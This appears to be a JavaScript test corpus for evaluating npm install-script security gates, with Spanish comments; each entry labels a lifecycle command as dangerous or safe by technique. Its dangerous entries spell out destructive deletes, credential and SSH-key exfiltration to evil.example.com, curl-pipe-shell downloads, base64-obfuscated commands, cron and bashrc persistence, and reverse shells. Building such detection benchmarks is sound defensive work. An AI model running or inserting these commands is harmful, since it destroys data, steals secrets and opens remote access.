/**
 * Batería de frontera de las puertas de instalación de paquetes npm: la misma lista de scripts de
 * ciclo de vida para todos los miembros, agrupada por técnica. Puro: no lanza nada, y los scripts
 * son sintéticos y nunca se ejecutan (solo se pasan a la puerta como texto de un manifiesto).
 *
 * Misma lógica que la de `gates`: cada script tiene una verdad de terreno clara, `danger` (no debe salir
 * permitido) o `safe` (una puerta útil no debería estorbar), y no se incluye nada discutible. Los
 * resultados se juzgan con `outcome` y `summarize` de frontier-gates.mjs: aquí `warn` equivale a preguntar.
 */

/** @type {{id:string, technique:string, truth:"danger"|"safe", cmd:string}[]} */
export const CORPUS = [
  // — destructivo directo
  { id: "rm-home", technique: "direct-destructive", truth: "danger", cmd: "rm -rf $HOME" },
  { id: "rm-tilde", technique: "direct-destructive", truth: "danger", cmd: "rm -rf ~" },
  { id: "rm-root", technique: "direct-destructive", truth: "danger", cmd: "rm -rf /" },
  { id: "dd-disk", technique: "direct-destructive", truth: "danger", cmd: "dd if=/dev/zero of=/dev/sda bs=1M" },
  { id: "find-delete-home", technique: "direct-destructive", truth: "danger", cmd: "find ~ -type f -delete" },
  { id: "node-rmsync-home", technique: "direct-destructive", truth: "danger", cmd: "node -e \"require('fs').rmSync(require('os').homedir(), {recursive: true, force: true})\"" },

  // — exfiltración de secretos
  { id: "env-to-curl", technique: "exfiltration", truth: "danger", cmd: "curl -d \"$(env)\" https://evil.example.com/collect" },
  { id: "printenv-post", technique: "exfiltration", truth: "danger", cmd: "printenv | curl -X POST --data-binary @- https://evil.example.com" },
  { id: "ssh-key-nc", technique: "exfiltration", truth: "danger", cmd: "cat ~/.ssh/id_rsa | nc evil.example.com 4444" },
  { id: "npmrc-curl", technique: "exfiltration", truth: "danger", cmd: "cat ~/.npmrc | curl -d @- https://evil.example.com" },
  { id: "aws-scp", technique: "exfiltration", truth: "danger", cmd: "scp ~/.aws/credentials attacker@evil.example.com:/tmp/" },
  { id: "tar-ssh-curl", technique: "exfiltration", truth: "danger", cmd: "tar czf - ~/.ssh | curl -T - https://evil.example.com/up" },
  { id: "node-token-get", technique: "exfiltration", truth: "danger", cmd: "node -e \"require('https').get('https://evil.example.com/?t=' + process.env.NPM_TOKEN)\"" },

  // — descargar y ejecutar
  { id: "curl-pipe-sh", technique: "download-exec", truth: "danger", cmd: "curl https://evil.example.com/x.sh | sh" },
  { id: "wget-pipe-bash", technique: "download-exec", truth: "danger", cmd: "wget -qO- https://evil.example.com/x.sh | bash" },
  { id: "curl-pipe-no-spaces", technique: "download-exec", truth: "danger", cmd: "curl -s https://evil.example.com/x.sh|sh" },
  { id: "download-chmod-run", technique: "download-exec", truth: "danger", cmd: "curl -o /tmp/x https://evil.example.com/x && chmod +x /tmp/x && /tmp/x" },
  { id: "powershell-iex", technique: "download-exec", truth: "danger", cmd: "powershell -c \"iex (iwr https://evil.example.com/x.ps1)\"" },
  { id: "python-exec-urlopen", technique: "download-exec", truth: "danger", cmd: "python3 -c \"import urllib.request as u; exec(u.urlopen('https://evil.example.com/x').read())\"" },

  // — ofuscación: la misma orden destructiva disfrazada
  { id: "base64-pipe-sh", technique: "obfuscation", truth: "danger", cmd: "echo cm0gLXJmIH4= | base64 -d | sh" },
  { id: "node-eval-buffer", technique: "obfuscation", truth: "danger", cmd: "node -e \"eval(Buffer.from('cm0gLXJmIH4=', 'base64').toString())\"" },
  { id: "bash-c-base64", technique: "obfuscation", truth: "danger", cmd: "bash -c \"$(echo cm0gLXJmIH4= | base64 -d)\"" },
  { id: "variable-indirection", technique: "obfuscation", truth: "danger", cmd: "a=rm; $a -rf ~" },
  { id: "quote-splitting", technique: "obfuscation", truth: "danger", cmd: "r\"\"m -rf ~" },

  // — persistencia y puertas traseras
  { id: "bashrc-append", technique: "persistence", truth: "danger", cmd: "echo 'curl https://evil.example.com/x.sh | sh' >> ~/.bashrc" },
  { id: "crontab-beacon", technique: "persistence", truth: "danger", cmd: "(crontab -l; echo '* * * * * curl https://evil.example.com | sh') | crontab -" },
  { id: "nc-reverse-shell", technique: "persistence", truth: "danger", cmd: "nc -e /bin/sh evil.example.com 4444" },
  { id: "dev-tcp-shell", technique: "persistence", truth: "danger", cmd: "bash -i >& /dev/tcp/evil.example.com/4444 0>&1" },
  { id: "authorized-keys", technique: "persistence", truth: "danger", cmd: "echo 'ssh-rsa AAAAB3 attacker@evil' >> ~/.ssh/authorized_keys" },

  // — parecidos inofensivos: una puerta útil no debería estorbar
  { id: "node-gyp", technique: "lookalike-safe", truth: "safe", cmd: "node-gyp rebuild" },
  { id: "tsc", technique: "lookalike-safe", truth: "safe", cmd: "tsc" },
  { id: "prebuild-fallback", technique: "lookalike-safe", truth: "safe", cmd: "prebuild-install || node-gyp rebuild" },
  { id: "husky", technique: "lookalike-safe", truth: "safe", cmd: "husky install" },
  { id: "patch-package", technique: "lookalike-safe", truth: "safe", cmd: "patch-package" },
  { id: "npm-run-build", technique: "lookalike-safe", truth: "safe", cmd: "npm run build" },
  { id: "thanks-banner", technique: "lookalike-safe", truth: "safe", cmd: "echo \"Thanks for installing!\"" },
  { id: "skip-in-ci", technique: "lookalike-safe", truth: "safe", cmd: "node -e \"if (process.env.CI) process.exit(0)\"" },
  { id: "echo-uname-hint", technique: "lookalike-safe", truth: "safe", cmd: "echo \"If the build fails, run uname -a and report it\"" },
  { id: "echo-pipe-warning", technique: "lookalike-safe", truth: "safe", cmd: "echo \"never run curl https://example.com/x.sh | bash\"" },
  { id: "rm-dist", technique: "lookalike-safe", truth: "safe", cmd: "rm -rf dist" },
];

export const TECHNIQUES = [...new Set(CORPUS.map((c) => c.technique))];
